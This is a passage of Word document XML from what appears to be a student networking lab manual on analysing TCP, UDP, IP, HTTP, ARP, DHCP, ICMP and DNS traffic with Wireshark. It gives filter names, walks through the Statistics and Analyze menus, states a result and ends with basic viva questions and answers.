          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>UDP: udp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A53CF0" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>IP: ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAA6BD1" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>HTTP: http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE11B5B" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ARP: arp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A781F7" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>DHCP: bootp (DHCP is part of the BOOTP protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00290EBF" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ICMP: icmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2357A4C5" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>DNS: dns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AFB7C5" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="416C943E" w14:textId="7A29A98D" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B78A64B" wp14:editId="7E905439">
            <wp:extent cx="5731510" cy="3677296"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="3677296"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F55C0B2" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AA54BE4" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49064D56" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D7FF698" w14:textId="025D1BF6" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Follow Streams:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312430E3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>For TCP or UDP conversations, right-click a packet and select Follow &gt; TCP Stream or Follow &gt; UDP Stream to see the conversation in readable form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54743E1E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="01FC0BC4" wp14:editId="3D5C17D3">
            <wp:extent cx="4873184" cy="208488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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4873184" cy="2084887"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7FF3F2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Protocol Hierarchy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BE45BB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Use Statistics &gt; Protocol Hierarchy to get an overview of protocols present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2225771D" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="110AC749" wp14:editId="658BE687">
            <wp:extent cx="5731509" cy="1345603"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1345603"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6745476C" w14:textId="4E44029F" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Packet Details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D1EC7F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Select any packet and expand protocol layers in the middle pane to analyze headers and payload details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6AC469" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4317ACEC" wp14:editId="7E51B871">
            <wp:extent cx="6002630" cy="1421342"/>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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6002630" cy="1421342"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FDEF26" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Conversations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCC5A26" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Use Statistics &gt; Conversations to analyze communication between source and destination hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AB3960" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="201DB7AC" wp14:editId="2F1BF543">
            <wp:extent cx="6136186" cy="2252685"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6136186" cy="2252685"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC4DBFD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Endpoints:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB9048E" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Go to Statistics &gt; Endpoints to list all active IP/MAC addresses involved in the capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE9508B" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A3F1160" w14:textId="43F090A1" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5E9CD285" wp14:editId="41452796">
            <wp:extent cx="5731510" cy="2907012"/>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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2907012"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="008A4D18" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>I/O Graphs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BC548E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Use Statistics &gt; I/O Graphs to visualize traffic rate and identify spikes or drops over time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5804A653" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="150C7538" wp14:editId="19F9A303">
            <wp:extent cx="5731510" cy="345287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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="3452870"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="456DA22E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Expert Information:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1454A3B5" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Open Analyze &gt; Expert Information to detect errors, warnings, and retransmissions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF43F23" w14:textId="512F080C" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="18EF7060" wp14:editId="34B6D4E3">
            <wp:extent cx="5731510" cy="5591872"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="5591872"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E95CBF" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D604D42" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B270140" w14:textId="7D980E0F" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6267BE6D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus network traffic on TCP/UDP/IP/HTTP/ARP/DHCP/ICMP /DNS were analyzed using Wireshark Tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4101550F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2423FEEF" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79EE2E39" w14:textId="29C2758A" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B28E4C8" w14:textId="0C1E1A93" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is Wireshark?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADDBFAC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Wireshark is a network protocol analyzer used to capture, monitor, and analyze network traffic in real time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480EFC6E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is a packet in a computer network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F6E4BA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A packet is a small unit of data transmitted from one device to another over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B16219" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is the purpose of capturing network traffic?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0D5191" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Capturing network traffic helps in troubleshooting network problems, monitoring performance, and investigating security incidents.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FF1B96" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What is a capture filter in Wireshark?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD249B1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A capture filter is used to capture only specific types of network traffic during packet collection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37620369" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4629B394" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>host 192.168.1.1</w:t>
      </w:r>
    </w:p>
